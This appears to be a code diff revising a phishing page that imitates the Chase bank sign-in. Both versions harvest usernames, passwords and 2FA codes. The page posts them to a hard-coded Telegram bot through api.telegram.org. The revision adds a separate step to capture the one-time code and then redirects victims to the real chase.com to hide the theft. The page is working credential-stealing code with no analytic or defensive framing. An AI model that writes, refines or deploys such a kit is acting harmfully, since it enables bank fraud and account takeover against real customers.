@@ -1,50 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Chase - Verify Your Identity</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chase - Sign In</title>
 <style>
-body { font-family: Arial, sans-serif; background: #f4f4f4; margin:0; padding:20px; }
-.container { max-width:400px; margin:auto; background:#fff; padding:20px; border-radius:8px; box-shadow:0 0 10px
-rgba(0,0,0,0.1); }
-img { display:block; margin:0 auto 20px; width:200px; }
-input[type=text], input[type=password] { width:100%; padding:12px; margin:8px 0; border:1px solid #ccc; border-radius:4px;
-box-sizing:border-box; }
-button { width:100%; background:#126bc5; color:#fff; padding:12px; border:none; border-radius:4px; cursor:pointer;
-font-size:16px; }
-.error { color:red; margin-top:10px; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: Arial, Helvetica, sans-serif; background: #f7f7f7; }
+.header { background: #0b5cab; padding: 15px 20px; }
+.header img { width: 120px; }
+.container { max-width: 400px; margin: 40px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px
+10px rgba(0,0,0,0.1); }
+.logo-row { text-align: center; margin-bottom: 20px; }
+.logo-row img { width: 150px; }
+h2 { color: #0b5cab; font-size: 22px; margin-bottom: 10px; text-align: center; }
+p.subtitle { color: #555; font-size: 14px; margin-bottom: 20px; text-align: center; }
+label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; font-size: 14px; }
+input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px;
+font-size: 16px; margin-bottom: 15px; }
+input:focus { outline: none; border-color: #0b5cab; }
+button { width: 100%; background: #0b5cab; color: #fff; border: none; padding: 14px; border-radius: 4px; font-size: 16px;
+cursor: pointer; font-weight: bold; }
+button:hover { background: #084a8f; }
+.helper-text { font-size: 12px; color: #777; margin-top: 15px; text-align: center; }
+.error { color: #c00; margin-top: 10px; text-align: center; }
+#step2 { display: none; }
 </style>
 </head>
 <body>
-<div class="container">
-<img src="https://www.chase.com/etc/designs/chase-ux/img/chase-logo.png" alt="Chase">
-<h2 style="text-align:center;">Security Verification</h2>
-<p style="text-align:center;">We detected unusual activity. Confirm your identity to unlock your account.</p>
-<form id="loginForm">
-<input type="text" id="username" placeholder="Username" required><br>
-<input type="password" id="password" placeholder="Password" required><br>
-<input type="text" id="otp" placeholder="2FA Code (if prompted)" ><br>
-<button type="submit">Verify</button>
-<p class="error" id="errorMsg"></p>
-</form>
+<div class="header">
+    <img src="https://www.chase.com/etc/designs/chase-ux/img/chase-logo.png" alt="Chase">
+</div>
+<div class="container" id="step1">
+    <h2>Sign in to your account</h2>
+    <p class="subtitle">Enter your username and password</p>
+    <form id="loginForm">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" autocomplete="off" required>
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" autocomplete="off" required>
+        <button type="submit">Sign in</button>
+        <div class="error" id="errorMsg"></div>
+    </form>
+    <p class="helper-text">New to Chase? <a href="https://www.chase.com" style="color:#0b5cab;">Enroll now</a></p>
+</div>
+<div class="container" id="step2">
+    <h2>Verify your identity</h2>
+    <p class="subtitle">We sent a verification code to your phone</p>
+    <form id="otpForm">
+        <label for="otp">Enter code</label>
+        <input type="text" id="otp" name="otp" inputmode="numeric" maxlength="6" autocomplete="off" required>
+        <button type="submit">Verify</button>
+        <div class="error" id="otpError"></div>
+    </form>
+    <p class="helper-text">Didn't receive a code? <a href="#" style="color:#0b5cab;">Resend code</a></p>
 </div>
 <script>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-    const otp = document.getElementById('otp').value || 'none';
-    const message = `CHASE LOGIN\nUser: ${username}\nPass: ${password}\n2FA: ${otp}\nIP: ${window.location.hostname}`;
-    const botToken = '8610254587:AAEXZL1gK86eJeKk_N5VnI8NNaTLZD96E6E';
-    const chatId = '6263246736';
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+const botToken = '8610254587:AAEXZL1gK86eJeKk_N5VnI8NNaTLZD96E6E';
+const chatId = '6263246736';
+
+function sendTelegram(text) {
+    return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-    }).then(() => {
-        document.getElementById('errorMsg').textContent = 'Verification failed. Please try again.';
+        body: JSON.stringify({ chat_id: chatId, text: text })
+    });
+}
+
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    const msg = `CHASE LOGIN\nUser: ${user}\nPass: ${pass}`;
+    sendTelegram(msg).then(() => {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
     }).catch(() => {
-        document.getElementById('errorMsg').textContent = 'Verification failed. Please try again.';
+        document.getElementById('errorMsg').textContent = 'Connection error. Please try again.';
+    });
+});
+
+document.getElementById('otpForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const code = document.getElementById('otp').value;
+    const msg = `CHASE OTP CODE: ${code}`;
+    sendTelegram(msg).then(() => {
+        window.location.href = 'https://www.chase.com';
+    }).catch(() => {
+        document.getElementById('otpError').textContent = 'Invalid code. Please try again.';
     });
 });
 </script>
